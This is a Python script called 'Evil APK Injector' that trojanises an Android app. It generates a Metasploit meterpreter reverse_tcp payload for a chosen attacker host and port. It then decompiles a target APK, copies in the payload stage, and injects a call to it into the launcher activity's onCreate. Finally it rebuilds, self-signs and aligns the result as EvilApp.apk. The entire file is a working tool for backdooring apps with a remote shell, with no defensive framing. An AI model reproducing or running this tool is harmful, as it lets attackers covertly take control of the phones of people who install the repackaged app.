import os
import argparse
import subprocess
import shutil
import xml.etree.ElementTree as ET
import sys

REQUIRED_TOOLS = {
    "keytool": "openjdk-11-jdk",
    "jarsigner": "openjdk-11-jdk",
    "zipalign": "zipalign",
    "msfvenom": "metasploit-framework"
}

HOOK_CODE = "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"

APKTOOL_URL_SCRIPT = "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool"
APKTOOL_URL_JAR = "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.11.1.jar"


def check_dependencies():
    print("[*] Checking dependencies...")
    # Check apktool manually
    if shutil.which("apktool") is None:
        print("[!] apktool not found. Installing manually...")
        run_cmd(f"wget -q {APKTOOL_URL_SCRIPT} -O /usr/bin/apktool")
        run_cmd(f"wget -q {APKTOOL_URL_JAR} -O /usr/bin/apktool.jar")
        run_cmd("chmod +x /usr/bin/apktool /usr/bin/apktool.jar")
        print("[+] apktool installed manually.")
    else:
        print("[+] Found: apktool")

    for tool, pkg in REQUIRED_TOOLS.items():
        if shutil.which(tool) is None:
            print(f"[!] {tool} not found. Attempting to install: {pkg}")
            run_cmd(f"apt-get update && apt-get install -y {pkg}")
        else:
            print(f"[+] Found: {tool}")


def run_cmd(cmd):
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        print(f"[!] Command failed: {cmd}")
        exit(1)


def find_launcher_activity(manifest_path):
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    namespace = '{http://schemas.android.com/apk/res/android}'

    for application in root.findall('application'):
        for activity in application.findall('activity'):
            for intent_filter in activity.findall('intent-filter'):
                actions = [action.attrib.get(namespace + 'name') for action in intent_filter.findall('action')]
                categories = [cat.attrib.get(namespace + 'name') for cat in intent_filter.findall('category')]

                if 'android.intent.action.MAIN' in actions and 'android.intent.category.LAUNCHER' in categories:
                    activity_name = activity.attrib.get(namespace + 'name')
                    if activity_name.startswith('.'):
                        package = root.attrib.get('package')
                        activity_name = package + activity_name
                    return activity_name.replace('.', '/') + ".smali"

    print("[!] Could not find launcher activity")
    exit(1)


def inject_hook(smali_root, launcher_path):
    smali_file = os.path.join(smali_root, launcher_path)
    if not os.path.exists(smali_file):
        print(f"[!] Launcher smali file not found: {smali_file}")
        exit(1)

    with open(smali_file, 'r') as f:
        lines = f.readlines()

    for i, line in enumerate(lines):
        if '.method' in line and 'onCreate' in line:
            for j in range(i, len(lines)):
                if 'invoke-super' in lines[j]:
                    lines.insert(j + 1, f"    {HOOK_CODE}\n")
                    break
            break

    with open(smali_file, 'w') as f:
        f.writelines(lines)


def main():
    parser = argparse.ArgumentParser(description="Evil APK Injector")
    parser.add_argument("-x", "--apk", required=True, help="Target APK")
    parser.add_argument("--lhost", required=True, help="Local host for reverse shell")
    parser.add_argument("--lport", required=True, help="Local port for reverse shell")

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    apk = args.apk
    lhost = args.lhost
    lport = args.lport

    check_dependencies()

    print("[*] Generating msfvenom payload")
    run_cmd(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > payload.apk")

    print("[*] Decompiling target APK")
    run_cmd(f"apktool d -f {apk} -o original")

    print("[*] Decompiling payload APK")
    run_cmd("apktool d -f payload.apk -o payload")

    print("[*] Copying Stage")
    os.makedirs("original/smali/com/metasploit/stage", exist_ok=True)
    shutil.copytree("payload/smali/com/metasploit/stage", "original/smali/com/metasploit/stage", dirs_exist_ok=True)

    print("[*] Injecting launcher hook")
    launcher_smali = find_launcher_activity("original/AndroidManifest.xml")
    inject_hook("original/smali", launcher_smali)

    print("[*] Rebuilding target apk")
    run_cmd("apktool b original -o unsigned.apk")

    print("[*] Generating keystroke")
    if not os.path.exists("mykeystore.ks"):
        run_cmd("keytool -genkey -v -keystore mykeystore.ks -alias mykeyalias -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname \"CN=example\"")

    print("[*] Signing target APK")
    run_cmd("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykeystore.ks -storepass password -keypass password unsigned.apk mykeyalias")

    print("[*] Zipalign target APK")
    run_cmd("zipalign -v 4 unsigned.apk EvilApp.apk")

    print("[+] Evil APK generated: EvilApp.apk")


if __name__ == "__main__":
    main()
